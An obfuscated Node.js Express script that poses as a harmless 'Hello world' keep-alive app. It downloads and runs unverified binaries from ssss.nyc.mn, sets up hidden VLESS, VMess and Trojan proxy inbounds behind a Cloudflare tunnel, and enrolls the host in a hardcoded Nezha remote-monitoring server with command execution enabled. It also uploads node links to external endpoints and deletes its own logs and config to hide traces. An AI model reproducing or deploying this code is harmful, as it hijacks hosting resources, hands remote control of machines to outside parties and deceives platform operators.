const _0x4c8e28=_0x5b69;function _0x5258(){const _0xdaa61b=['NEZHA_PORT','path','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','CFPORT','ArgoDomain\x20not\x20found,\x20retrying...','Subscription\x20(Base64):','\x0a\x20\x20\x20\x20service:\x20http://localhost:','catch','config.yaml','/api/add-nodes','[Monitor]\x20Restarting\x20web...','NAME','floor','get','web','\x0acredentials-file:\x20','php','ArgoDomain:','createWriteStream','14457CcErVU','./php','web\x20is\x20running','Hello\x20world!\x20|\x20Uptime:\x20','pgrep\x20-f\x20\x22web\x22\x20||\x20echo\x20\x22not\x20running\x22','arm','127.0.0.1','\x0a\x0avmess://','URL:\x20http://localhost:','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://amd64.ssss.nyc.mn/web','from','blackhole','test','8443','repeat','CFIP','/config.json\x20>/dev/null\x202>&1\x20&','App\x20is\x20running\x20successfully!','quic','unshift','php\x20running\x20error:\x20','child_process','fileName','fileUrl','Error\x20downloading\x20files:','vmess','npm','68HfLHZo','863376LZVGeP','finish','set','\x20failed:\x20','/vless-argo','xtls-rprx-vision','https://oooo.serv00.net/add-url','https://arm64.ssss.nyc.mn/agent','4538ocyILU','aeda22b7-7b25-4390-992d-5b24590a0382','express','unlinkSync','vless','/php\x20-c\x20\x22','https://amd64.ssss.nyc.mn/agent','post','https://arm64.ssss.nyc.mn/2go','2087','Galaxy','base64','pong','all','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','Use\x20quick\x20tunnels','PROJECT_URL','toISOString','742296YQEbUF','arm64','nohup\x20','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/vmess-argo','306iUNTzd','heapUsed','has','2096','nezha.vexio.ggff.net:443','[Memory]\x20Heap:\x20','php\x20is\x20running','stream','443','&type=ws&host=','none','aarch64','./bot','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','Nodes\x20uploaded','/api/delete-nodes','join','split','status','round','Content-Type','then','data','Download\x20','842940zbpOnd','memoryUsage','[Self]\x20Keep-alive\x20failed','--tls','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','https+local://8.8.8.8/dns-query','sub.txt','https://amd64.ssss.nyc.mn/v1','curl\x20-s\x20https://speed.cloudflare.com/meta\x202>/dev/null\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','stringify','chmodSync','tcp','124140ygohrh','length','trim','[Self]\x20Keep-alive\x20#','\x202>/dev/null','message','unlink','/bot\x20','direct','?encryption=none&security=tls&sni=','log','now','match','?security=tls&sni=','tunnel.json','block','\x0aprotocol:\x20http2\x0aingress:\x0a\x20\x20-\x20hostname:\x20','bot','lOPaJUbXQw8cCjC4fF8FImNC3jdVoG0l','SUB_PATH','url','mkdirSync','\x20successfully','https://arm64.ssss.nyc.mn/v1','UPLOAD_URL','web\x20running\x20error:\x20','Sub:\x20http://localhost:','/ping','Subscription\x20uploaded','/vmess-argo?ed=2560','/trojan-argo','/dev/null','ARGO_PORT','toString','readFileSync','includes','forEach','https://arm64.ssss.nyc.mn/web','config.json','pkill\x20-f\x20\x22[b]ot\x22\x202>/dev/null','Error\x20executing\x20command:\x20','\x20>/dev/null\x202>&1\x20&','\x20is\x20created','./web','PORT','text/plain;\x20charset=utf-8','filter','/web\x20-c\x20','amd','https://amd64.ssss.nyc.mn/2go','781700jFdPFp','[External]\x20Ping\x20success','http','true','map','rm\x20-rf\x20','pgrep\x20-f\x20\x22bot\x22\x20||\x20echo\x20\x22not\x20running\x22','\x0a\x0atrojan://','writeFileSync','json','tls','env','UUID','galaxy','AUTO_ACCESS','boot.log','send','tunnel:\x20','&path=%2Fvless-argo%3Fed%3D2560#','42CgyjNQ','error','ARGO_DOMAIN:','utf-8','NEZHA_SERVER','existsSync','arch','\x20already\x20exists','trojan','close','tunnel.yml','ARGO_AUTH','bot\x20is\x20running'];_0x5258=function(){return _0xdaa61b;};return _0x5258();}(function(_0x38f324,_0x4da757){const _0x180264=_0x5b69,_0x414a74=_0x38f324();while(!![]){try{const _0x3aef84=-parseInt(_0x180264(0x138))/0x1*(-parseInt(_0x180264(0x17e))/0x2)+-parseInt(_0x180264(0x158))/0x3*(parseInt(_0x180264(0x175))/0x4)+parseInt(_0x180264(0x125))/0x5+parseInt(_0x180264(0x176))/0x6+parseInt(_0x180264(0x1ad))/0x7+parseInt(_0x180264(0x190))/0x8+-parseInt(_0x180264(0x195))/0x9*(parseInt(_0x180264(0x1b9))/0xa);if(_0x3aef84===_0x4da757)break;else _0x414a74['push'](_0x414a74['shift']());}catch(_0x29ec29){_0x414a74['push'](_0x414a74['shift']());}}}(_0x5258,0x19926));const express=require(_0x4c8e28(0x180)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x4c8e28(0x146)),{promisify}=require('util'),exec=promisify(require(_0x4c8e28(0x16f))['exec']),{execSync}=require(_0x4c8e28(0x16f)),UPLOAD_URL=process[_0x4c8e28(0x130)][_0x4c8e28(0x1d1)]||'',PROJECT_URL=process[_0x4c8e28(0x130)][_0x4c8e28(0x18e)]||'',AUTO_ACCESS=process['env'][_0x4c8e28(0x133)]||_0x4c8e28(0x128),FILE_PATH=process[_0x4c8e28(0x130)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x4c8e28(0x130)][_0x4c8e28(0x1cc)]||'sub',PORT=process['env']['SERVER_PORT']||process['env'][_0x4c8e28(0x11f)]||0xbb8,UUID=process['env'][_0x4c8e28(0x131)]||_0x4c8e28(0x17f),NEZHA_SERVER=process['env'][_0x4c8e28(0x13c)]||_0x4c8e28(0x199),NEZHA_PORT=process[_0x4c8e28(0x130)][_0x4c8e28(0x145)]||'',NEZHA_KEY=process[_0x4c8e28(0x130)]['NEZHA_KEY']||_0x4c8e28(0x1cb),ARGO_DOMAIN=process[_0x4c8e28(0x130)]['ARGO_DOMAIN']||'',ARGO_AUTH=process[_0x4c8e28(0x130)][_0x4c8e28(0x143)]||'',ARGO_PORT=process[_0x4c8e28(0x130)][_0x4c8e28(0x113)]||0x822,CFIP=process[_0x4c8e28(0x130)][_0x4c8e28(0x169)]||'www.shopify.com',CFPORT=process['env'][_0x4c8e28(0x148)]||0x1bb,NAME=process[_0x4c8e28(0x130)][_0x4c8e28(0x150)]||_0x4c8e28(0x132);let keepAliveCount=0x0,startTime=Date['now']();!fs[_0x4c8e28(0x13d)](FILE_PATH)?(fs[_0x4c8e28(0x1ce)](FILE_PATH,{'recursive':!![]}),console[_0x4c8e28(0x1c3)](FILE_PATH+_0x4c8e28(0x11d))):console[_0x4c8e28(0x1c3)](FILE_PATH+_0x4c8e28(0x13f));function _0x5b69(_0x2f6686,_0x51ea4e){_0x2f6686=_0x2f6686-0x10c;const _0x52580c=_0x5258();let _0x5b6994=_0x52580c[_0x2f6686];return _0x5b6994;}const npmPath=path[_0x4c8e28(0x1a5)](FILE_PATH,'npm'),phpPath=path['join'](FILE_PATH,_0x4c8e28(0x155)),webPath=path['join'](FILE_PATH,'web'),botPath=path[_0x4c8e28(0x1a5)](FILE_PATH,_0x4c8e28(0x1ca)),subPath=path[_0x4c8e28(0x1a5)](FILE_PATH,_0x4c8e28(0x1b3)),listPath=path[_0x4c8e28(0x1a5)](FILE_PATH,'list.txt'),bootLogPath=path[_0x4c8e28(0x1a5)](FILE_PATH,_0x4c8e28(0x134)),configPath=path[_0x4c8e28(0x1a5)](FILE_PATH,_0x4c8e28(0x119));app[_0x4c8e28(0x152)]('/',(_0x4f7ef2,_0x159bf3)=>{const _0xdab588=_0x4c8e28,_0x227917=Math[_0xdab588(0x151)]((Date[_0xdab588(0x1c4)]()-startTime)/0x3e8);_0x159bf3[_0xdab588(0x135)](_0xdab588(0x15b)+_0x227917+'s\x20|\x20Keep-alive\x20count:\x20'+keepAliveCount);}),app['get']('/health',(_0x51af40,_0x48f7f1)=>{const _0x30c661=_0x4c8e28;_0x48f7f1[_0x30c661(0x1a7)](0xc8)['json']({'status':'ok','timestamp':new Date()[_0x30c661(0x18f)](),'uptime':Math[_0x30c661(0x151)]((Date[_0x30c661(0x1c4)]()-startTime)/0x3e8),'keepAliveCount':keepAliveCount});}),app[_0x4c8e28(0x152)]('/ping',(_0x308bff,_0x1520d7)=>{const _0x53c178=_0x4c8e28;keepAliveCount++,_0x1520d7[_0x53c178(0x1a7)](0xc8)[_0x53c178(0x135)](_0x53c178(0x18a));}),app[_0x4c8e28(0x152)]('/keep-alive',(_0x2e4ca1,_0x44fb34)=>{const _0x15c036=_0x4c8e28;keepAliveCount++,_0x44fb34[_0x15c036(0x1a7)](0xc8)[_0x15c036(0x12e)]({'status':'alive','count':keepAliveCount});});function deleteNodes(){const _0x33be0d=_0x4c8e28;try{if(!UPLOAD_URL)return;if(!fs[_0x33be0d(0x13d)](subPath))return;let _0x264cab;try{_0x264cab=fs[_0x33be0d(0x115)](subPath,_0x33be0d(0x13b));}catch{return null;}const _0x3c43db=Buffer['from'](_0x264cab,_0x33be0d(0x189))[_0x33be0d(0x114)](_0x33be0d(0x13b)),_0xd19da=_0x3c43db[_0x33be0d(0x1a6)]('\x0a')['filter'](_0xe70e25=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x33be0d(0x166)](_0xe70e25));if(_0xd19da['length']===0x0)return;return axios[_0x33be0d(0x185)](UPLOAD_URL+_0x33be0d(0x1a4),JSON[_0x33be0d(0x1b6)]({'nodes':_0xd19da}),{'headers':{'Content-Type':'application/json'}})['catch'](()=>null);}catch(_0x5cbe93){return null;}}function cleanupOldFiles(){const _0x151cce=_0x4c8e28,_0x436100=[_0x151cce(0x153),_0x151cce(0x1ca),_0x151cce(0x174),_0x151cce(0x155),'sub.txt','boot.log'];_0x436100[_0x151cce(0x117)](_0x520f96=>{const _0x113d83=_0x151cce,_0x4c064c=path[_0x113d83(0x1a5)](FILE_PATH,_0x520f96);fs[_0x113d83(0x1bf)](_0x4c064c,()=>{});});}const config={'log':{'access':_0x4c8e28(0x112),'error':_0x4c8e28(0x112),'loglevel':_0x4c8e28(0x19f)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4c8e28(0x182),'settings':{'clients':[{'id':UUID,'flow':_0x4c8e28(0x17b)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x4c8e28(0x17a),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x4c8e28(0x111),'dest':0xbbc}]},'streamSettings':{'network':_0x4c8e28(0x1b8)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x4c8e28(0x182),'settings':{'clients':[{'id':UUID}],'decryption':_0x4c8e28(0x19f)},'streamSettings':{'network':'tcp','security':_0x4c8e28(0x19f)}},{'port':0xbba,'listen':_0x4c8e28(0x15e),'protocol':_0x4c8e28(0x182),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x4c8e28(0x19f),'wsSettings':{'path':_0x4c8e28(0x17a)}},'sniffing':{'enabled':!![],'destOverride':[_0x4c8e28(0x127),_0x4c8e28(0x12f),_0x4c8e28(0x16c)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4c8e28(0x15e),'protocol':_0x4c8e28(0x173),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4c8e28(0x194)}},'sniffing':{'enabled':!![],'destOverride':[_0x4c8e28(0x127),_0x4c8e28(0x12f),_0x4c8e28(0x16c)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4c8e28(0x15e),'protocol':_0x4c8e28(0x140),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x4c8e28(0x19f),'wsSettings':{'path':_0x4c8e28(0x111)}},'sniffing':{'enabled':!![],'destOverride':[_0x4c8e28(0x127),_0x4c8e28(0x12f),_0x4c8e28(0x16c)],'metadataOnly':![]}}],'dns':{'servers':[_0x4c8e28(0x1b2)]},'outbounds':[{'protocol':'freedom','tag':_0x4c8e28(0x1c1)},{'protocol':_0x4c8e28(0x165),'tag':_0x4c8e28(0x1c8)}]};fs[_0x4c8e28(0x12d)](path[_0x4c8e28(0x1a5)](FILE_PATH,_0x4c8e28(0x119)),JSON[_0x4c8e28(0x1b6)](config,null,0x2));function getSystemArchitecture(){const _0x54cf7c=_0x4c8e28,_0x569bb5=os[_0x54cf7c(0x13e)]();if(_0x569bb5==='arm'||_0x569bb5===_0x54cf7c(0x191)||_0x569bb5===_0x54cf7c(0x1a0))return'arm';return _0x54cf7c(0x123);}function downloadFile(_0x43db33,_0x2dfcbb,_0x5f0199){const _0x56a4b9=_0x4c8e28,_0x36d15a=path[_0x56a4b9(0x1a5)](FILE_PATH,_0x43db33),_0x451b3e=fs[_0x56a4b9(0x157)](_0x36d15a);axios({'method':_0x56a4b9(0x152),'url':_0x2dfcbb,'responseType':_0x56a4b9(0x19c)})[_0x56a4b9(0x1aa)](_0x86cad5=>{const _0x5ba499=_0x56a4b9;_0x86cad5[_0x5ba499(0x1ab)]['pipe'](_0x451b3e),_0x451b3e['on'](_0x5ba499(0x177),()=>{const _0x26b840=_0x5ba499;_0x451b3e[_0x26b840(0x141)](),console['log']('Download\x20'+_0x43db33+_0x26b840(0x1cf)),_0x5f0199(null,_0x43db33);}),_0x451b3e['on'](_0x5ba499(0x139),_0x3ba5bc=>{const _0x5258c9=_0x5ba499;fs[_0x5258c9(0x1bf)](_0x36d15a,()=>{}),_0x5f0199(_0x5258c9(0x1ac)+_0x43db33+_0x5258c9(0x179)+_0x3ba5bc[_0x5258c9(0x1be)]);});})[_0x56a4b9(0x14c)](_0x454869=>_0x5f0199(_0x56a4b9(0x1ac)+_0x43db33+_0x56a4b9(0x179)+_0x454869[_0x56a4b9(0x1be)]));}function getFilesForArchitecture(_0xc916fe){const _0x558a67=_0x4c8e28;let _0x13c59f;_0xc916fe===_0x558a67(0x15d)?_0x13c59f=[{'fileName':_0x558a67(0x153),'fileUrl':_0x558a67(0x118)},{'fileName':'bot','fileUrl':_0x558a67(0x186)}]:_0x13c59f=[{'fileName':_0x558a67(0x153),'fileUrl':_0x558a67(0x163)},{'fileName':_0x558a67(0x1ca),'fileUrl':_0x558a67(0x124)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x3a7b80=_0xc916fe==='arm'?_0x558a67(0x17d):_0x558a67(0x184);_0x13c59f[_0x558a67(0x16d)]({'fileName':_0x558a67(0x174),'fileUrl':_0x3a7b80});}else{const _0x2ab05c=_0xc916fe===_0x558a67(0x15d)?_0x558a67(0x1d0):_0x558a67(0x1b4);_0x13c59f[_0x558a67(0x16d)]({'fileName':_0x558a67(0x155),'fileUrl':_0x2ab05c});}}return _0x13c59f;}async function downloadFilesAndRun(){const _0x297929=_0x4c8e28,_0x24806a=getSystemArchitecture(),_0x2e0ac7=getFilesForArchitecture(_0x24806a);if(_0x2e0ac7[_0x297929(0x1ba)]===0x0){console[_0x297929(0x1c3)]('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x22603c=_0x2e0ac7[_0x297929(0x129)](_0x41b748=>{return new Promise((_0x22c9c7,_0x452576)=>{const _0x37ec0c=_0x5b69;downloadFile(_0x41b748[_0x37ec0c(0x170)],_0x41b748[_0x37ec0c(0x171)],(_0x28807a,_0x523b89)=>{if(_0x28807a)_0x452576(_0x28807a);else _0x22c9c7(_0x523b89);});});});try{await Promise[_0x297929(0x18b)](_0x22603c);}catch(_0x5d4ce3){console[_0x297929(0x139)](_0x297929(0x172),_0x5d4ce3);return;}function _0x9943fa(_0x45dc62){const _0x490fc1=0x1fd;_0x45dc62['forEach'](_0x528a84=>{const _0x303e0a=_0x5b69,_0x419a3f=path[_0x303e0a(0x1a5)](FILE_PATH,_0x528a84);fs['existsSync'](_0x419a3f)&&(fs[_0x303e0a(0x1b7)](_0x419a3f,_0x490fc1),console[_0x303e0a(0x1c3)]('Empowerment\x20success\x20for\x20'+_0x419a3f));});}const _0x23a423=NEZHA_PORT?['./npm',_0x297929(0x11e),_0x297929(0x1a1)]:[_0x297929(0x159),_0x297929(0x11e),_0x297929(0x1a1)];_0x9943fa(_0x23a423);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4684ab=NEZHA_SERVER[_0x297929(0x116)](':')?NEZHA_SERVER[_0x297929(0x1a6)](':')['pop']():'',_0x599c74=new Set([_0x297929(0x19d),_0x297929(0x167),_0x297929(0x198),_0x297929(0x187),'2083','2053']),_0x4fdaa0=_0x599c74[_0x297929(0x197)](_0x4684ab)?_0x297929(0x128):'false',_0x7ecbd4='client_secret:\x20'+NEZHA_KEY+_0x297929(0x1a2)+NEZHA_SERVER+_0x297929(0x1b1)+_0x4fdaa0+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x297929(0x12d)](path[_0x297929(0x1a5)](FILE_PATH,_0x297929(0x14d)),_0x7ecbd4);try{await exec(_0x297929(0x192)+FILE_PATH+_0x297929(0x183)+FILE_PATH+_0x297929(0x161)),console[_0x297929(0x1c3)](_0x297929(0x19b));}catch(_0x4614db){console[_0x297929(0x139)](_0x297929(0x16e)+_0x4614db);}}else{let _0x426d1b='';[_0x297929(0x19d),_0x297929(0x167),'2096',_0x297929(0x187),'2083','2053']['includes'](NEZHA_PORT)&&(_0x426d1b=_0x297929(0x1b0));try{await exec(_0x297929(0x192)+FILE_PATH+'/npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x426d1b+'\x20>/dev/null\x202>&1\x20&'),console[_0x297929(0x1c3)]('npm\x20is\x20running');}catch(_0x82e439){console[_0x297929(0x139)]('npm\x20running\x20error:\x20'+_0x82e439);}}}await new Promise(_0x20b863=>setTimeout(_0x20b863,0x3e8));try{await exec(_0x297929(0x192)+FILE_PATH+_0x297929(0x122)+FILE_PATH+_0x297929(0x16a)),console[_0x297929(0x1c3)](_0x297929(0x15a));}catch(_0x23944e){console['error'](_0x297929(0x10c)+_0x23944e);}await new Promise(_0x2f9751=>setTimeout(_0x2f9751,0x3e8));if(fs[_0x297929(0x13d)](path[_0x297929(0x1a5)](FILE_PATH,_0x297929(0x1ca)))){let _0x197499;if(ARGO_AUTH[_0x297929(0x1c5)](/^[A-Z0-9a-z=]{120,250}$/))_0x197499=_0x297929(0x162)+ARGO_AUTH;else ARGO_AUTH[_0x297929(0x1c5)](/TunnelSecret/)?_0x197499=_0x297929(0x147)+FILE_PATH+'/tunnel.yml\x20run':_0x197499=_0x297929(0x18c)+FILE_PATH+_0x297929(0x193)+ARGO_PORT;try{await exec(_0x297929(0x192)+FILE_PATH+_0x297929(0x1c0)+_0x197499+_0x297929(0x11c)),console[_0x297929(0x1c3)](_0x297929(0x144));}catch(_0xf19988){console[_0x297929(0x139)](_0x297929(0x11b)+_0xf19988);}}await new Promise(_0x2fedf6=>setTimeout(_0x2fedf6,0x1388));}function argoType(){const _0x30f967=_0x4c8e28;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x30f967(0x1c3)](_0x30f967(0x18d));return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x30f967(0x12d)](path[_0x30f967(0x1a5)](FILE_PATH,_0x30f967(0x1c7)),ARGO_AUTH);const _0x5d71d1=_0x30f967(0x136)+ARGO_AUTH[_0x30f967(0x1a6)]('\x22')[0xb]+_0x30f967(0x154)+path[_0x30f967(0x1a5)](FILE_PATH,_0x30f967(0x1c7))+_0x30f967(0x1c9)+ARGO_DOMAIN+_0x30f967(0x14b)+ARGO_PORT+'\x0a\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20-\x20service:\x20http_status:404';fs['writeFileSync'](path[_0x30f967(0x1a5)](FILE_PATH,_0x30f967(0x142)),_0x5d71d1);}}argoType();async function extractDomains(){const _0x22f8dc=_0x4c8e28;let _0x39e1de;if(ARGO_AUTH&&ARGO_DOMAIN)_0x39e1de=ARGO_DOMAIN,console['log'](_0x22f8dc(0x13a),_0x39e1de),await _0x358069(_0x39e1de);else try{const _0x5e0eea=fs[_0x22f8dc(0x115)](path[_0x22f8dc(0x1a5)](FILE_PATH,'boot.log'),_0x22f8dc(0x13b)),_0x219a4e=_0x5e0eea[_0x22f8dc(0x1c5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x219a4e)_0x39e1de=_0x219a4e[0x1],console[_0x22f8dc(0x1c3)](_0x22f8dc(0x156),_0x39e1de),await _0x358069(_0x39e1de);else{console[_0x22f8dc(0x1c3)](_0x22f8dc(0x149));try{fs[_0x22f8dc(0x181)](path[_0x22f8dc(0x1a5)](FILE_PATH,_0x22f8dc(0x134)));}catch{}try{await exec(_0x22f8dc(0x11a));}catch{}await new Promise(_0x4a79ac=>setTimeout(_0x4a79ac,0xbb8));const _0x31d8e2='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;await exec('nohup\x20'+FILE_PATH+_0x22f8dc(0x1c0)+_0x31d8e2+'\x20>/dev/null\x202>&1\x20&'),await new Promise(_0x31960b=>setTimeout(_0x31960b,0x1388)),await extractDomains();}}catch(_0x2d6491){console[_0x22f8dc(0x139)]('Error\x20reading\x20boot.log:',_0x2d6491);}async function _0x358069(_0x488cda){const _0xa60f3=_0x22f8dc;let _0x3dd846=_0xa60f3(0x188);try{const _0x471500=execSync(_0xa60f3(0x1b5),{'encoding':_0xa60f3(0x13b),'timeout':0x2710});_0x3dd846=_0x471500[_0xa60f3(0x1bb)]()||_0xa60f3(0x188);}catch{}const _0x765296={'v':'2','ps':NAME+'-'+_0x3dd846,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xa60f3(0x19f),'net':'ws','type':'none','host':_0x488cda,'path':_0xa60f3(0x110),'tls':_0xa60f3(0x12f),'sni':_0x488cda,'alpn':''},_0x4fef9b='vless://'+UUID+'@'+CFIP+':'+CFPORT+_0xa60f3(0x1c2)+_0x488cda+_0xa60f3(0x19e)+_0x488cda+_0xa60f3(0x137)+NAME+'-'+_0x3dd846+_0xa60f3(0x15f)+Buffer['from'](JSON[_0xa60f3(0x1b6)](_0x765296))[_0xa60f3(0x114)](_0xa60f3(0x189))+_0xa60f3(0x12c)+UUID+'@'+CFIP+':'+CFPORT+_0xa60f3(0x1c6)+_0x488cda+_0xa60f3(0x19e)+_0x488cda+'&path=%2Ftrojan-argo%3Fed%3D2560#'+NAME+'-'+_0x3dd846;console[_0xa60f3(0x1c3)](_0xa60f3(0x14a)),console['log'](Buffer['from'](_0x4fef9b)['toString'](_0xa60f3(0x189))),fs[_0xa60f3(0x12d)](subPath,Buffer[_0xa60f3(0x164)](_0x4fef9b)['toString'](_0xa60f3(0x189))),fs[_0xa60f3(0x12d)](listPath,_0x4fef9b[_0xa60f3(0x1bb)]()),uplodNodes(),app[_0xa60f3(0x152)]('/'+SUB_PATH,(_0x249da3,_0x5f4cc8)=>{const _0x153f3d=_0xa60f3;keepAliveCount++,_0x5f4cc8[_0x153f3d(0x178)](_0x153f3d(0x1a9),_0x153f3d(0x120)),_0x5f4cc8[_0x153f3d(0x135)](Buffer['from'](_0x4fef9b)[_0x153f3d(0x114)](_0x153f3d(0x189)));}),app[_0xa60f3(0x152)]('/'+SUB_PATH+'/raw',(_0x868eb7,_0x52b72e)=>{const _0x136fa7=_0xa60f3;keepAliveCount++,_0x52b72e[_0x136fa7(0x178)](_0x136fa7(0x1a9),_0x136fa7(0x120)),_0x52b72e[_0x136fa7(0x135)](_0x4fef9b[_0x136fa7(0x1bb)]());});}}async function uplodNodes(){const _0x4338c4=_0x4c8e28;if(UPLOAD_URL&&PROJECT_URL)try{await axios['post'](UPLOAD_URL+'/api/add-subscriptions',{'subscription':[PROJECT_URL+'/'+SUB_PATH]},{'headers':{'Content-Type':'application/json'}}),console[_0x4338c4(0x1c3)](_0x4338c4(0x10f));}catch{}else{if(UPLOAD_URL&&fs[_0x4338c4(0x13d)](listPath)){const _0x2a1dfa=fs[_0x4338c4(0x115)](listPath,_0x4338c4(0x13b)),_0x298b01=_0x2a1dfa[_0x4338c4(0x1a6)]('\x0a')[_0x4338c4(0x121)](_0x3ebe2f=>/(vless|vmess|trojan):\/\//[_0x4338c4(0x166)](_0x3ebe2f));if(_0x298b01[_0x4338c4(0x1ba)]>0x0)try{await axios['post'](UPLOAD_URL+_0x4338c4(0x14e),{'nodes':_0x298b01},{'headers':{'Content-Type':'application/json'}}),console[_0x4338c4(0x1c3)](_0x4338c4(0x1a3));}catch{}}}}function selfKeepAlive(){setInterval(async()=>{const _0x2081dc=_0x5b69;try{await axios[_0x2081dc(0x152)]('http://localhost:'+PORT+_0x2081dc(0x10e),{'timeout':0x1388}),console[_0x2081dc(0x1c3)](_0x2081dc(0x1bc)+keepAliveCount);}catch(_0x546457){console['log'](_0x2081dc(0x1af));}},0x2bf20);}async function registerExternalKeepAlive(){const _0x4c476b=_0x4c8e28;if(!PROJECT_URL)return;const _0x25b339=[{'url':_0x4c476b(0x17c),'data':{'url':PROJECT_URL}}];for(const _0xfaa9da of _0x25b339){try{await axios[_0x4c476b(0x185)](_0xfaa9da['url'],_0xfaa9da[_0x4c476b(0x1ab)],{'headers':{'Content-Type':'application/json'},'timeout':0x2710}),console['log']('Registered\x20with\x20keep-alive\x20service:\x20'+_0xfaa9da['url']);}catch(_0x29aca6){console[_0x4c476b(0x1c3)]('Failed\x20to\x20register:\x20'+_0xfaa9da[_0x4c476b(0x1cd)]);}}}function externalPing(){if(!PROJECT_URL)return;setInterval(async()=>{const _0x1d08e7=_0x5b69;try{await axios[_0x1d08e7(0x152)](PROJECT_URL+_0x1d08e7(0x10e),{'timeout':0x2710}),console[_0x1d08e7(0x1c3)](_0x1d08e7(0x126));}catch(_0x2b4e31){console['log']('[External]\x20Ping\x20failed');}},0x3a980);}function monitorProcesses(){setInterval(async()=>{const _0x1c618b=_0x5b69;try{const {stdout:_0x598908}=await exec(_0x1c618b(0x15c));_0x598908['includes']('not\x20running')&&(console[_0x1c618b(0x1c3)](_0x1c618b(0x14f)),await exec(_0x1c618b(0x192)+FILE_PATH+_0x1c618b(0x122)+FILE_PATH+_0x1c618b(0x16a)));const {stdout:_0x51a18a}=await exec(_0x1c618b(0x12b));if(_0x51a18a['includes']('not\x20running')&&fs[_0x1c618b(0x13d)](botPath)){console['log']('[Monitor]\x20Restarting\x20bot...');let _0x252b20=_0x1c618b(0x18c)+FILE_PATH+_0x1c618b(0x193)+ARGO_PORT;ARGO_AUTH[_0x1c618b(0x1c5)](/^[A-Z0-9a-z=]{120,250}$/)&&(_0x252b20=_0x1c618b(0x162)+ARGO_AUTH),await exec(_0x1c618b(0x192)+FILE_PATH+_0x1c618b(0x1c0)+_0x252b20+_0x1c618b(0x11c));}}catch(_0x20be9b){}},0x493e0);}function memoryActivity(){let _0x913e14=0x0;setInterval(()=>{const _0x40b928=_0x5b69;_0x913e14++;const _0x312940=process[_0x40b928(0x1ae)]();_0x913e14%0xa===0x0&&console['log'](_0x40b928(0x19a)+Math[_0x40b928(0x1a8)](_0x312940[_0x40b928(0x196)]/0x400/0x400)+'MB\x20|\x20Counter:\x20'+_0x913e14);},0xea60);}function cleanFiles(){setTimeout(()=>{const _0x5dacf2=_0x5b69;exec(_0x5dacf2(0x12a)+bootLogPath+'\x20'+configPath+_0x5dacf2(0x1bd)),console['log']('='[_0x5dacf2(0x168)](0x32)),console[_0x5dacf2(0x1c3)](_0x5dacf2(0x16b)),console['log'](_0x5dacf2(0x160)+PORT+'/'),console[_0x5dacf2(0x1c3)](_0x5dacf2(0x10d)+PORT+'/'+SUB_PATH),console[_0x5dacf2(0x1c3)]('='[_0x5dacf2(0x168)](0x32));},0xea60);}async function startserver(){const _0x1d08ca=_0x4c8e28;console['log']('='[_0x1d08ca(0x168)](0x32)),console[_0x1d08ca(0x1c3)]('Starting\x20Galaxy\x20App\x20with\x20Enhanced\x20Keep-Alive...'),console[_0x1d08ca(0x1c3)]('='[_0x1d08ca(0x168)](0x32)),deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),selfKeepAlive(),await registerExternalKeepAlive(),externalPing(),monitorProcesses(),memoryActivity(),cleanFiles();}startserver(),app['listen'](PORT,()=>{const _0xda3efd=_0x4c8e28;console[_0xda3efd(0x1c3)]('Server\x20running\x20on\x20port\x20'+PORT);});
